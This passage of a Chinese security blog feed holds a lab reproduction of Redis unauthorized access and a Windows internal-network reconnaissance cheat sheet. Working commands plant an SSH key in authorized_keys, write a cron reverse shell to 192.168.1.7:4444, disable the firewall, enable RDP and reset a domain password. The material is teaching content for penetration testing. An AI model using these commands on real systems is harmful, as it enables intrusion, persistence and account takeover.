class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ssh-keygen -t rsa                                                                                                                                     1 ⨯</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:v7Cz1OKpvm8nlkBgWEmfcXmle+dprjPETRabUpr2pYk root@kali</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|   +o.. .. ..    |</span><br><span class="line">|  . +. +. ..  o  |</span><br><span class="line">|   . .o  ..  + + |</span><br><span class="line">|      .    .= = .|</span><br><span class="line">|     .  S .o.B.+ |</span><br><span class="line">|      .  o .Eo=. |</span><br><span class="line">|       .+.o.  +  |</span><br><span class="line">|       o*=..oo   |</span><br><span class="line">|     .+**=. .+.  |</span><br><span class="line">+----[SHA256]-----+</span><br></pre></td></tr></table></figure><p><code>将公钥写入key.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# (echo -e &quot;\n&quot;;cat /root/.ssh/id_rsa.pub;echo -e &quot;\n&quot;)&gt;key.txt</span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# cat key.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPQNEvzuCM3mruZvGSf1h6N56NItvVRApcAcPZQqsG8hnTmQCqPMucVqVNJEaPn9/EcOLayXtPkiS8HjEqUBg3OqMJS7YdCedx89uUk2zD4MxbBY4HjBn0zRgtDlGBbopDPnbPIok1jM9agFsHp3hJUlspBHMvKha6iZOGZZOAnjy/Aa4VV9u/idPhpqyIdXKv+EsJ/hgKP27kgxc+sFmm0AUj+KrhoIc7Ah5lW14w+GRSIpxcYfU3Fv9qydOm4bJ4HR/8Fqq15VLUpkfLy93okLDaaK1FZYyQ9cF+2dvrn9hcCFvxX8fQ7D6Xi3AxsWt3L4dWioM9CmEeSCa/vqP3IiAI2rkbq5A6uW+ydDE16OTgDEPQjjInqfy5T/jrqb2OeBaJ4ro7cr04hQWJ/PO6a9+XlW3kEYnb2kdJy3AgBOFAOyhdzY20/8frUJLEyQix6TKC9JCqOp3uGY2z33KseJzPka6tC+Dzco0Y010WQMutneRf+Li5YADJagHPBWU= root@kali</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>将key.txt写入redis缓冲区</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# cat key.txt | redis-cli -h 192.168.1.9 -x set key</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">这里可能需要关闭RDB持久化 192.168.1.9:6379&gt; config <span class="built_in">set</span> stop-writes-on-bgsave-error no</span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /root/.ssh</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ssh -i /root/.ssh/id_rsa root@192.168.1.9</span><br><span class="line">Last login: Sun Jul 18 23:57:55 2021 from 192.168.1.7</span><br><span class="line">[root@mail ~]#</span><br></pre></td></tr></table></figure><h4 id="04-corn定时任务反弹shell"><a href="#04-corn定时任务反弹shell" class="headerlink" title="04.corn定时任务反弹shell"></a>04.corn定时任务反弹shell</h4><p><code>kali监听</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kali登入redis写入反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; set demo &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.7/4444 0&gt;&amp;1\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dir /var/spool/cron</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">前后用\n换行，避免和redis里其他缓存数据混合</span></span><br></pre></td></tr></table></figure><p><code>得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.1.7] from (UNKNOWN) [192.168.1.9] 35030</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@mail ~]#</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Redis未授权访问漏洞&quot;&gt;&lt;a href=&quot;#Redis未授权访问漏洞&quot; class=&quot;headerlink&quot; title=&quot;Redis未授权访问漏洞&quot;&gt;&lt;/a&gt;Redis未授权访问漏洞&lt;/h1&gt;&lt;h2 id=&quot;一、漏洞简介&quot;&gt;&lt;a href=&quot;#一、漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;一、漏洞简介&quot;&gt;&lt;/a&gt;一、漏洞简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。&lt;/p&gt;
&lt;p&gt;漏洞的产生条件有以下两点:&lt;/p&gt;
&lt;p&gt;(1)  Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网&lt;/p&gt;
&lt;p&gt;(2)  没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis/"/>
    
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透测试-信息收集</title>
    <link href="https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://lunamoore.github.io/2021/07/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2021-07-17T10:39:19.000Z</published>
    <updated>2021-07-17T10:56:12.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-工作组信息收集"><a href="#0x01-工作组信息收集" class="headerlink" title="0x01.工作组信息收集"></a>0x01.工作组信息收集</h2><h3 id="01-检测当前shell权限"><a href="#01-检测当前shell权限" class="headerlink" title="01.检测当前shell权限"></a>01.检测当前shell权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /user    #查看当前用户的SID</span><br><span class="line">whoami /priv    #查看当前用户的安全权限</span><br><span class="line">whoami /all</span><br></pre></td></tr></table></figure><h3 id="02-查看当前系统信息"><a href="#02-查看当前系统信息" class="headerlink" title="02.查看当前系统信息"></a>02.查看当前系统信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h3 id="03-tcp-udp-网络连接状态"><a href="#03-tcp-udp-网络连接状态" class="headerlink" title="03.tcp/udp 网络连接状态"></a>03.tcp/udp 网络连接状态</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nao</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="04-主机名"><a href="#04-主机名" class="headerlink" title="04.主机名"></a>04.主机名</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><h3 id="05-当前操作系统版本"><a href="#05-当前操作系统版本" class="headerlink" title="05.当前操作系统版本"></a>05.当前操作系统版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS name&quot; /C:&quot;OS Version&quot;    #英文版</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;    #中文版</span><br><span class="line">wmic OS GET Caption,CSDVersion,OSArchitecture,Version    #更详细</span><br></pre></td></tr></table></figure><h3 id="06-查看系统体系结构"><a href="#06-查看系统体系结构" class="headerlink" title="06.查看系统体系结构"></a>06.查看系统体系结构</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h3 id="07-查杀软"><a href="#07-查杀软" class="headerlink" title="07.查杀软"></a>07.查杀软</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct GET displayName /Format:List</span><br></pre></td></tr></table></figure><h3 id="08-查看安装的程序"><a href="#08-查看安装的程序" class="headerlink" title="08.查看安装的程序"></a>08.查看安装的程序</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product get  name,version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><h3 id="09-查看在线用户"><a href="#09-查看在线用户" class="headerlink" title="09.查看在线用户"></a>09.查看在线用户</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><h3 id="10-查看网络配置"><a href="#10-查看网络配置" class="headerlink" title="10.查看网络配置"></a>10.查看网络配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><h3 id="11-查看进程与信息"><a href="#11-查看进程与信息" class="headerlink" title="11.查看进程与信息"></a>11.查看进程与信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><h3 id="12-查看当前登入域"><a href="#12-查看当前登入域" class="headerlink" title="12.查看当前登入域"></a>12.查看当前登入域</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><h3 id="13-远程桌面历史连接记录"><a href="#13-远程桌面历史连接记录" class="headerlink" title="13.远程桌面历史连接记录"></a>13.远程桌面历史连接记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure><h3 id="14-查看用户列表"><a href="#14-查看用户列表" class="headerlink" title="14.查看用户列表"></a>14.查看用户列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h3 id="15-查看用户信息"><a href="#15-查看用户信息" class="headerlink" title="15.查看用户信息"></a>15.查看用户信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><h3 id="16-查看本机服务信息"><a href="#16-查看本机服务信息" class="headerlink" title="16.查看本机服务信息"></a>16.查看本机服务信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><h3 id="17-查看启动程序信息"><a href="#17-查看启动程序信息" class="headerlink" title="17.查看启动程序信息"></a>17.查看启动程序信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><h3 id="18-查看计划任务"><a href="#18-查看计划任务" class="headerlink" title="18.查看计划任务"></a>18.查看计划任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><h3 id="19-查看主机开机时间"><a href="#19-查看主机开机时间" class="headerlink" title="19.查看主机开机时间"></a>19.查看主机开机时间</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><h3 id="20-获取本地管理员信息-通常包括域用户"><a href="#20-获取本地管理员信息-通常包括域用户" class="headerlink" title="20.获取本地管理员信息[通常包括域用户]"></a>20.获取本地管理员信息[通常包括域用户]</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><h3 id="21-显示连接会话"><a href="#21-显示连接会话" class="headerlink" title="21.显示连接会话"></a>21.显示连接会话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="22-查看安装过的补丁"><a href="#22-查看安装过的补丁" class="headerlink" title="22.查看安装过的补丁"></a>22.查看安装过的补丁</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><h3 id="23-查看共享列表"><a href="#23-查看共享列表" class="headerlink" title="23.查看共享列表"></a>23.查看共享列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net sharewmic share get name,path,status</span><br></pre></td></tr></table></figure><h3 id="24-查看路由表与ARP缓存表"><a href="#24-查看路由表与ARP缓存表" class="headerlink" title="24.查看路由表与ARP缓存表"></a>24.查看路由表与ARP缓存表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route printarp -a</span><br></pre></td></tr></table></figure><h3 id="25-防火墙相关"><a href="#25-防火墙相关" class="headerlink" title="25.防火墙相关"></a>25.防火墙相关</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable    #server 2003之前版本关闭防火墙netsh advfirewall set allprofiles state off #server 2003之后版本关闭防火墙netsh firewall show config    #查看防火墙配置netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable    #server 2003之前版本允许指定程序连接netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c:\nc.exe&quot;    #server 2003之后允许指定程序进入netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;c:\nc.exe&quot;    #server 2003之后允许指定程序出去netsh advfirewall firewall add rule name=&quot;RPC&quot; protocol=TCP dir=in localport=3389 action=allow #放行3389netsh advfirewall set currentprofile logging filename &quot;c:\windows\temp\fw.log&quot;    #自定义防火墙日志文件位置</span><br></pre></td></tr></table></figure><h3 id="26-查看代理配置情况"><a href="#26-查看代理配置情况" class="headerlink" title="26.查看代理配置情况"></a>26.查看代理配置情况</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><h3 id="27-查询并开启远程连接服务"><a href="#27-查询并开启远程连接服务" class="headerlink" title="27.查询并开启远程连接服务"></a>27.查询并开启远程连接服务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #查看远程连接端口(RDP) 3389端口十六进制为0xd3d</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003版本以下开启3389</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003版本以下关闭3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #server 2003版本以上开启3389(win7可以)</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 0    #server 2003版本以上关闭3389</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1    #server 2008/2012版本开启3389(win7不可以)</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f    #server 2008/2012版本开启3389</span><br></pre></td></tr></table></figure><h2 id="0x02-域内信息收集"><a href="#0x02-域内信息收集" class="headerlink" title="0x02.域内信息收集"></a>0x02.域内信息收集</h2><h3 id="01-查看域用户信息"><a href="#01-查看域用户信息" class="headerlink" title="01.查看域用户信息"></a>01.查看域用户信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user /domain    #显示所在域的用户名单</span><br><span class="line">net user 域用户 /domain    #获取域用户的详细信息</span><br><span class="line">net user /domain xxx 123456    #修改域用户密码，需要管理员权限</span><br></pre></td></tr></table></figure><h3 id="02-查询域信任列表"><a href="#02-查询域信任列表" class="headerlink" title="02.查询域信任列表"></a>02.查询域信任列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v</span><br></pre></td></tr></table></figure><h3 id="03-返回域控与其对应的IP"><a href="#03-返回域控与其对应的IP" class="headerlink" title="03.返回域控与其对应的IP"></a>03.返回域控与其对应的IP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nltest /dsgetdc:jiye</span><br><span class="line">nslookup -type=SRV _ldap._tcp    #查看域控主机名</span><br><span class="line">netdom query pdc    #查询域控</span><br></pre></td></tr></table></figure><h3 id="04-域用户组相关查询"><a href="#04-域用户组相关查询" class="headerlink" title="04.域用户组相关查询"></a>04.域用户组相关查询</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain    #查看域管理员列表net group &quot;domain controllers&quot; /domain    #查看域控制器(如果有多台)net group &quot;domain computers&quot; /domain    #查看域机器net group &quot;domain users&quot; /domain    #查看域全部用户net group /domain    #查看域里工作组net localgroup administrators    #查看本机管理员[通常含有域用户]net localgroup administrators /domain    #登入本机的域管理员net localgroup administrators workgroup\user /add    #域用户添加到本机</span><br></pre></td></tr></table></figure><h2 id="04-获取域内用户和管理员信息-域控"><a href="#04-获取域内用户和管理员信息-域控" class="headerlink" title="04.获取域内用户和管理员信息(域控)"></a>04.获取域内用户和管理员信息(域控)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get /all    #获取域内用户的详细信息dsquery user        #查看存在用户dsquery computer    #查询目录中的计算机dsquery contact        #查询目录中的联系人dsquery subnet        #查询目录中的子网dsquery group        #查询目录中的组dsquery ou            #查询目录中的组织单位dsquery site        #查询目录中的站点dsquery server        #查询目录中的AD DC/LDS实例dsquery user        #查询目录中的用户dsquery quota        #查询目录中的配额规定dsquery partition    #查询目录中的分区dsquery * -            #用通用的LDAP查询目录中的任何对象</span><br></pre></td></tr></table></figure><h3 id="05-域主机相关查询"><a href="#05-域主机相关查询" class="headerlink" title="05.域主机相关查询"></a>05.域主机相关查询</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view    #查看同一域内机器列表net view \\IP    #查看某IP共享net view \\DC    #查看DC计算机的共享资源列表net view /domain    #查看内网存在多少个域net view /domain:jiye    #查看jiye域中的机器列表</span><br></pre></td></tr></table></figure><h3 id="06-查看域用户密码过期等信息"><a href="#06-查看域用户密码过期等信息" class="headerlink" title="06.查看域用户密码过期等信息"></a>06.查看域用户密码过期等信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure><h3 id="07-判断域是否存在"><a href="#07-判断域是否存在" class="headerlink" title="07.判断域是否存在"></a>07.判断域是否存在</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /allsysteminfonet config workstation    #当前登入域</span><br></pre></td></tr></table></figure><h3 id="08-判断主域"><a href="#08-判断主域" class="headerlink" title="08.判断主域"></a>08.判断主域</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain执行以上命令通常有三种情况：1.存在域，但当前用户不是域用户，会出现拒绝访问结果2.存在域，但当前用户是域用户，得到正常输出3.当前环境为工作组，不存在域，会出现找不到域控信息</span><br></pre></td></tr></table></figure><h3 id="09-利用NetBios-网络邻居-探测内网"><a href="#09-利用NetBios-网络邻居-探测内网" class="headerlink" title="09.利用NetBios(网络邻居)探测内网"></a>09.利用NetBios(网络邻居)探测内网</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe是一个命令行工具，可以扫描开放NetBios名称服务器nbtscan-1.0.35.exe 10.10.10.0/2410.10.10.10     JIYE\DC                         SHARING DC10.10.10.20     JIYE\WIN7DC1                    SHARING*timeout (normal end of scan)</span><br></pre></td></tr></table></figure><h3 id="10-ICMP协议快速探测内网"><a href="#10-ICMP协议快速探测内网" class="headerlink" title="10.ICMP协议快速探测内网"></a>10.ICMP协议快速探测内网</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p><code>vbs脚本探测</code></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;10.10.10.&quot;</span> </span><br><span class="line"><span class="keyword">Set</span> objFSO= <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)  </span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span> </span><br><span class="line">strComputer = strSubNet &amp; i </span><br><span class="line">blnResult = Ping(strComputer) </span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alive ! :) &quot;</span> </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"> <span class="keyword">Next</span>  </span><br><span class="line"> </span><br><span class="line">objTS.Close </span><br><span class="line">WScript.Echo <span class="string">&quot; All Ping scan, All Done!) &quot;</span>   </span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer) </span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>) </span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>) </span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems </span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.StatusCode </span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span> </span><br><span class="line">Ping = <span class="literal">True</span> </span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span> </span><br><span class="line">Ping = <span class="literal">False</span> 